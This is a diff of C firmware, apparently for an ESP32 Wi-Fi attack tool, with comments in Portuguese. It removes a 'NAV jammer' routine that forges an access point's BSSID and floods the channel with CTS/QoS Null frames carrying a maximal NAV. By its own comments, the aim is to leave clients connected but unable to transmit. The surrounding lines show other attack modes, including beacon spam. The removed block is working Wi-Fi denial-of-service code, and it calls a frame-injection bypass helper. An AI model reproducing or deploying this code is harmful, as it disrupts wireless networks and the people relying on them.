@@ -137,36 +137,6 @@ void attackTask(void *parameter) {
     }
 
     // NAV JAMMER — flood QoS Null Data com BSSID forjado do AP alvo
-    // NAV puro: NÃO desconecta — apenas congela o canal.
-    // Clientes ficam "conectados" mas sem conseguir transmitir.
-    else if (ctsAtivo && radioLocked) {
-      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
-
-        uint8_t canal_alvo =
-            (canalTravado >= 1 && canalTravado <= 14) ? canalTravado : 1;
-        uint8_t canal_atual;
-        wifi_second_chan_t segundo;
-        esp_wifi_get_channel(&canal_atual, &segundo);
-        if (canal_atual != canal_alvo) {
-          esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
-        }
-
-        // Burst de 8 QoS Null frames com NAV=32767μs
-        // BSSID forjado = AP alvo → clientes reconhecem e honram NAV
-        // Sem deauth: mantém conexão, mata velocidade
-        for (int i = 0; i < 8; i++) {
-          esp_err_t ret = wsl_bypasser_send_cts_frame(apRecordSelecionado.bssid);
-          if (ret == ESP_OK) ctsCounter++;
-        }
-
-        xSemaphoreGive(wifiMutex);
-
-        // 10ms entre bursts — NAV de 32ms cobre gaps
-        vTaskDelay(pdMS_TO_TICKS(10));
-      } else {
-        vTaskDelay(pdMS_TO_TICKS(5));
-      }
-    }
 
     // BEACON SPAM — N redes fixas no celular, ataque contínuo
     else if (beaconAtivo && radioLocked) {
